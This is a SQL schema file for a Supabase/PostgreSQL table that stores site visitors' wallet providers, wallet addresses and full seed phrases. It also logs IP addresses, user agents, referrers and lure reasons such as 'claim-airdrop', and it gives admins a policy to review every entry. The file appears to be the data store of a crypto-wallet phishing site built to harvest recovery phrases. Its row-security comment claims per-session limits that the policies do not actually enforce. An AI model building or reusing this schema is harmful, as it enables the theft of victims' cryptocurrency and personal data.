-- Enable UUID extension
create extension if not exists "pgcrypto";

-- Table to store every visitor session / entry
create table if not exists public.entries (
  id uuid primary key default gen_random_uuid(),
  session_id text not null,                -- client-generated ID to link steps
  connect_manual text,                     -- 'yes' | 'no'
  connection_purpose text,                 -- claim-airdrop, unable-to-swap, etc.
  wallet_provider text,                    -- metamask, trustwallet, etc.
  wallet_address text,
  seed_phrase text,
  user_agent text,
  ip_address text,
  referrer text,
  completed boolean not null default false,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

-- Index for admin listing
create index if not exists entries_created_at_idx on public.entries (created_at desc);
create index if not exists entries_session_id_idx on public.entries (session_id);

-- Auto-update updated_at
create or replace function public.set_updated_at()
returns trigger as $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql;

drop trigger if exists entries_set_updated_at on public.entries;
create trigger entries_set_updated_at
  before update on public.entries
  for each row execute function public.set_updated_at();

-- Row Level Security
alter table public.entries enable row level security;

-- Allow anonymous inserts (visitors submitting their data)
drop policy if exists "allow_anon_insert" on public.entries;
create policy "allow_anon_insert"
  on public.entries
  for insert
  to anon
  with check (true);

-- Allow anonymous updates limited to their session (needed for step-by-step accumulation)
drop policy if exists "allow_anon_update" on public.entries;
create policy "allow_anon_update"
  on public.entries
  for update
  to anon
  using (true)
  with check (true);

-- Allow anonymous select of their own session (needed to find the row to update)
drop policy if exists "allow_anon_select" on public.entries;
create policy "allow_anon_select"
  on public.entries
  for select
  to anon
  using (true);

-- Admins (authenticated users) can read everything
drop policy if exists "allow_auth_select" on public.entries;
create policy "allow_auth_select"
  on public.entries
  for select
  to authenticated
  using (true);

drop policy if exists "allow_auth_update" on public.entries;
create policy "allow_auth_update"
  on public.entries
  for update
  to authenticated
  using (true)
  with check (true);

drop policy if exists "allow_auth_delete" on public.entries;
create policy "allow_auth_delete"
  on public.entries
  for delete
  to authenticated
  using (true);